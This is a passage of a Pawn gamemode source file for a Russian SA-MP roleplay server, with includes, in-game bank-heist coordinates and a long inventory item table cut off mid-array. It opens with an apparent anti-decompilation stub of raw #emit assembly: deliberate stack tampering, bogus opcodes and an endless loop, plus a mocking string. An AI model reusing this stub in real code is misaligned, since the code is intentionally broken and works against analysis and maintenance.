
@___If_u_can_read_this_u_r_nerd();
@___If_u_can_read_this_u_r_nerd()
{
#emit stack 0x7FFFFFFF
#emit inc.s cellmax
static const ___[][] = {"Za vami viehali FBI", "by Batka1337"};
#emit retn
#emit load.s.pri ___
#emit proc
#emit proc
#emit fill cellmax
#emit proc
#emit stor.alt ___
#emit strb.i 2
#emit switch 4
#emit retn
L1:
#emit jump L1
#emit zero cellmin
}

#define STREAMER_ACTOR_SD 	100.0
#include 					<a_samp>
#include 					<a_http>
#include 					<sscanf2>
#include 					<a_mysqlnew1>
#include 					<zcmd>
#include 					<foreach>
#include 					<a_actor>
//#include 					<mxINI>
//#include                    <rapid-fire>
#include 					<hexcolor>
#include 					<Server>
//#include 					<TOTP>
#include 					<md5>
#include 					<streamer>
#include 					<mesto>
#include                    <jit>
//#include 					<crashdetect>
#include 					<Pawn.RakNet>
#include 					<progress>
#include 					<fix_kick>

#include 					<weapon-config>
//#include 					<ucaller>
//#define MAILER_URL 		"l-rp.ru/mailer.php"

//#include 					<mailer>
#include 					<map_fix>

#define VK_DOMAIN 			"vk.maryland-rp.ru"


#define INC_SECURITY_CODE_LENGHT    15

#define T_MONEY 1
#define T_DONATE 2
#define T_INV 3
#define T_VEH 4


#define HTTP_GET                        1
#define HTTP_POST                       2
#define HTTP_HEAD                       3
#define HTTP_ERROR_BAD_HOST             1
#define HTTP_ERROR_NO_SOCKET            2
#define HTTP_ERROR_CANT_CONNECT         3
#define HTTP_ERROR_CANT_WRITE           4
#define HTTP_ERROR_CONTENT_TOO_BIG      5
#define HTTP_ERROR_MALFORMED_RESPONSE   6

#define MySQL_DEBUG         1

new ItemsName[14][15] = {"HeadPhones","Hat","Panama","Cap","Helmet","Beret","Wig","Glasses","Bandan","Hat","Watches","Backpack","Hat","Bandan"};
new ItemsMax[14] = {3,5,2,11,5,4,1,17,9,4,12,2,3,4};
#define MAX_SLOTS 66
enum inv
{
	iSlot,
	iKol
};
new lsbankphoto[3],lvbankphoto[3],policeform,armygrab,util;
new Float:YachPos[][] = {

{1394.4589,1.1724,1000.9153}, // 1
{1392.9376,1.2375,1000.9153}, // 2
{1391.4456,1.2401,1000.9153}, // 3
{1389.8893,1.2378,1000.9153}, // 4
{1388.4857,1.2386,1000.9153}, // 5
{1386.9344,1.2371,1000.9153} // 6
};
new bankkasls,bankkaslv;
new Float:PhotoPosLS[][] = {
{1429.7915,-1049.4708,23.3159 , 1459.3877,-1013.6942,26.8438},
{1529.6902,-1016.0897,43.1495 , 1516.9640,-1019.1637,41.8296},
{1422.7955,-914.5013,36.0469, 1422.7955,-914.5013,36.0469}
};
new Float:PhotoPosLV[][] = {
{2515.4360,2228.4946,10.6719 , 2466.5237,2242.7493,10.8203},
{2410.4351,2336.4656,10.8203 , 2449.4717,2319.9316,10.8203},
{2511.4485,2264.8396,15.4332, 2488.3445,2259.7417,15.4332}
};


enum bk
{
	bYaStatus[6],
	bankDoor[5],
	bTime,
	bankStaff,
	bGrab
}
new BankHack[2][bk];

new staffcom,cinghack,setbomb,Text3D:YachText[2][6],yachek[6],poscarls,poscarlv;
enum bg
{
	bLeader,
	bPlayer[3],
	bVeh,
	bTimes,
	bQuest[5],
	bTown,
	bGrab,
	bTickBomb,
	bBombStatus,
	bGrabStatus
}
new BankGrab[100][bg];

new PlaneObj;
new PlaneMap;
new PlaneSklad;
new PlaneShot;
new PlaneStatus;
new PlaneTime,PlaneCount;
new Text3D:PlaneText;
new Text:Auction[22];
new InvInfo[MAX_PLAYERS][inv][MAX_SLOTS];
new LastDriver[MAX_VEHICLES];
new PlayerText:AuctionP[MAX_PLAYERS][10];
new bankpic[2];
new Text:AdminPanel[26];
new PlayerText:AdminPanelP[3][MAX_PLAYERS];
#define I_TIE 315
#define I_MASK 316
#define I_PHONE 317
#define I_SMOKE 319
#define I_HEAL 320
#define I_KAN 322
#define I_DRUGS 337
#define I_CASE 445
#define I_TAXI 446
#define I_MATS 447
#define MAX_WANTED 100
enum winf
{
	wID,
	wName[32],
	wWanted
}
new WInfo[MAX_WANTED][winf];
new TOTALWANTED;
enum bank_bot
{
	    Float:b_Coords[4],
	    b_Virt,
	    b_Int,
	    b_Tes
}
new BankBots[14][bank_bot] = {
{{9.4034,2.0507,1996.0850,89.2630},1,3,1},
{{9.4040,-2.0627,1996.0850,91.1431},1,3,1},
{{1383.8633,-23.2555,1004.4440,88.2062},1,66,0}, // bankbot
{{1383.8671,-25.4196,1004.4440,96.0396},1,66,0}, // bankbot
{{1383.8601,-27.9785,1004.4440,89.1462},1,66,0}, // bankbot
{{1383.8660,-30.3098,1004.4440,91.3395},1,66,0}, // bankbot
{{1383.8611,-32.6016,1004.4440,89.7729},1,66,0}, // bankbot
{{1383.8635,-34.7916,1004.4449,95.4129},1,66,0}, // bankbot
{{1383.8633,-23.2555,1004.4440,88.2062},2,66,0}, // bankbot
{{1383.8671,-25.4196,1004.4440,96.0396},2,66,0}, // bankbot
{{1383.8601,-27.9785,1004.4440,89.1462},2,66,0}, // bankbot
{{1383.8660,-30.3098,1004.4440,91.3395},2,66,0}, // bankbot
{{1383.8611,-32.6016,1004.4440,89.7729},2,66,0}, // bankbot
{{1383.8635,-34.7916,1004.4449,95.4129},2,66,0} // bankbot
};
new Text3D:ContText[6];
new MaxBet[6];
new bool:Containers[6];
static Float:ContainerPos[][] = {
{2823.122802,-2383.476318,14.477978,2824.099853,-2383.495117,14.266113},
{2822.993896,-2390.074707,14.477978,2823.970947,-2390.093505,14.266113},
{2822.864990,-2396.673095,14.477978,2823.842041,-2396.691894,14.266113},
{2822.739990,-2403.071533,14.477978,2823.717041,-2403.090332,14.266113},
{2822.517333,-2414.468750,14.477978,2823.494384,-2414.487548,14.266113},
{2822.392333,-2420.867187,14.477978,2823.369384,-2420.885986,14.266113},
{2822.255615,-2427.865478,14.477978,2823.232666,-2427.884277,14.266113}
};
new container;
new Float:Bankomats[][] = {
	{5.5302,7.5006,1996.0850},
	{5.5374,-7.4576,1996.0850},
	{1378.9219,-26.3920,1000.9133},
	{1378.9222,-24.2128,1000.9133},
	{1378.9222,-22.0199,1000.9133},
	{1378.9233,-19.8705,1000.9133},
	{1378.9232,-17.6027,1000.9133},
	{1378.9230,-15.3949,1000.9133}
};
new PlayerText:TuningP[14][MAX_PLAYERS];
new Text:Tuning[33];

enum InvTypeInfo
{
	invMax,
	invObj,
	invDropObj,
	bool:invUsed,
	invTitle[128],
	invText[25],
	Float:invRot[4],
	Float:invDropParam[6],
	bool:invOnDrop
}
static Float:GoTir[][] = {
{1386.5753,-18.7406,1000.9153}, // 3
{1386.4153,-11.6717,1000.9153}, // 1
{1386.2952,-15.4918,1000.9153}// 2
};
new fbidal;
new Float:Step4[][] = {
{1389.3595,-14.2665,1000.9299,271.7848}, // sbor 1
{1389.3595,-16.2399,1000.9299,271.7848}, // sbor 2
{1389.3595,-18.1354,1000.9299,271.7848}, // sbor 3
{1389.3595,-23.2425,1000.9299,271.7848}, // sbor 4
{1389.3594,-25.1923,1000.9299,271.7848}, // sbor 5
{1389.3595,-27.0039,1000.9299,271.7848} // sbor 6
};

new Float:Step2[][] = {
{1391.7968,-27.6951,1000.9299,86.6265}, // 2 step 1
{1391.7959,-25.7708,1000.9299,86.6265}, // 2 step 2
{1391.7972,-23.8634,1000.9299,86.6265}, // 2 step 3
{1391.7954,-18.7290,1000.9299,86.6265}, // 2 step 4
{1391.7964,-16.8120,1000.9299,86.6265}, // 2 step 5
{1391.7966,-14.8632,1000.9299,86.6265} // 2 step 6
};


new Float:Step2Obj[][] = {
{ 1390.99, -27.67, 1000.86},
{ 1390.99, -25.75, 1000.86},
{ 1390.99, -23.83, 1000.86},
{ 1390.99, -18.69, 1000.86},
{ 1390.99, -16.78, 1000.86},
{ 1390.99, -14.86, 1000.86}
};
new Float:Step4Obj[][] = {
{ 1390.22, -14.21, 1000.86},
{ 1390.22, -16.19, 1000.86},
{ 1390.22, -18.08, 1000.86},
{ 1390.22, -23.27, 1000.86},
{ 1390.22, -25.15, 1000.86},
{ 1390.22, -27.04, 1000.86}
};
new TirSp[3];
new PlayerText:CameraP[2][MAX_PLAYERS];
new Text:Camera[27];
new InvType[460][InvTypeInfo] = //туды ид обьектов   // [макс значение в стеке] [id обьекта картинка ] [ид обьекта который выпадет] [можно ли юзать] [название] [описание] [ротация картинки] [координата обьекта] [х,у,з]
{
	{0, 0, 0, false, "none", "none",{-16.000000, 0.000000, -55.000000, 100.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 1, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 2, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 3, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 4, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 5, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 6, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 7, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 8, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 9, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 10, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 11, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 12, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 13, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 14, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 15, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 16, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 17, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 18, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 19, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 20, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 21, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 22, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 23, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 24, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 25, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 26, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 27, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 28, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 29, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 30, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 31, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 32, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 33, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 34, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 35, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 36, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 37, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 38, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 39, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 40, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 41, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 42, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 43, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 44, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 45, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 46, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 47, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 48, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 49, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 50, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 51, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 52, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 53, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},//53
	{1, 54, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 55, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 56, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 57, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 58, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 59, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 60, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 61, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 62, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 63, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 64, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 65, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 66, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 67, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 68, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 69, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 70, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 71, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 72, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 73, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 74, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 75, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 76, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 77, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 78, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 79, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 80, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 81, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 82, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 83, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 84, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 85, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 86, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 87, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 88, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 89, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 90, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 91, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 92, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 93, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 94, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 95, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 96, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 97, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 98, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 99, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 100, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 101, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 102, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 103, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 104, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 105, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 106, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 107, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 108, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 109, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 110, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 111, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 112, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
